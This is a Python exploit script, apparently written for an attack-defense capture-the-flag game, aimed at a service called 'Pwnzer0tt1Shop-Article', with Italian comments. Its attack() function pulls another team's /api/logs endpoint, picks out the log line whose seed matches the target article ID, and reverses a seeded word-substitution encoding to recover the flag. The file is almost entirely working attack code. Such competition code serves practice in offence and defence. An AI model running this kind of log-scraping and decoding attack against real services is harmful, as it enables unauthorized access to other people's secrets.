#!/usr/bin/env python3
import random

def decode_with_words(encoded_string, seed):
    
    words = ["apple", "banana", "cat", "dog", "elephant", "fox", "grape", "hat", 
            "igloo", "jelly", "kite", "lemon", "monkey", "nest", "octopus", 
            "penguin", "queen", "rabbit", "sun", "tree", "umbrella", "violet", 
            "whale", "xray", "yacht", "zebra"]
    
    # Definisci le lettere che corrispondono ai numeri
    letters_for_numbers = list("abcdefghij")  # '0' -> 'a', '1' -> 'b', ..., '9' -> 'j'
    
    # Usa il seed fornito per garantire uno shuffle deterministico
    random.seed(seed)
    random.shuffle(words)
    random.shuffle(letters_for_numbers)
    
    # Crea la mappa dei caratteri (lettere -> parole)
    char_map = {chr(i): word for i, word in zip(range(97, 123), words)}
    
    # Crea la mappa dei numeri (numeri -> lettere)
    number_map = {str(i): letter for i, letter in zip(range(10), letters_for_numbers)}
    # Ricostruisci l'elenco di parole e lettere basato sul seed
    inverse_char_map = {v: k for k, v in char_map.items()}  # Inverti la mappa per la decodifica
    inverse_number_map = {v: k for k, v in number_map.items()}  # Inverti la mappa dei numeri

    # Dividi il testo codificato in parole
    words = encoded_string.split()
    
    result = []
    for word in words:
        if word in inverse_char_map:  # Se la parola è una lettera codificata
            result.append(inverse_char_map[word])
        elif word in inverse_number_map:  # Se la parola è un numero codificato
            result.append(inverse_number_map[word])
        else:
            result.append(word)  # Mantieni qualsiasi altra cosa come è
    return ''.join(result).upper()

class config:
    service = "Pwnzer0tt1Shop-Article"
    #CHANGE ME!!!!
    team_token = "token"
    my_team_ip = "10.60.team_id.1"

from _pwnshop_utils import PwnShopClient

def attack(team_ip: str, flag_id):
    client = PwnShopClient(team_ip)
    logs = client.req.get(f"http://{team_ip}/api/logs").text
    for line in logs.splitlines():
    
        first_split = line.split("(")
        if len(first_split) < 2:
            continue
        data = first_split[1].split(")")[0]
        
        data_parts = data.split(",")
        if len(data_parts) < 2:
            continue
        
        seed = int(data_parts[0].split(" ")[-1])
        if seed != flag_id["article_id"]:
            continue
        encoded_string = data_parts[1]
        result = decode_with_words(encoded_string, seed)
        return result
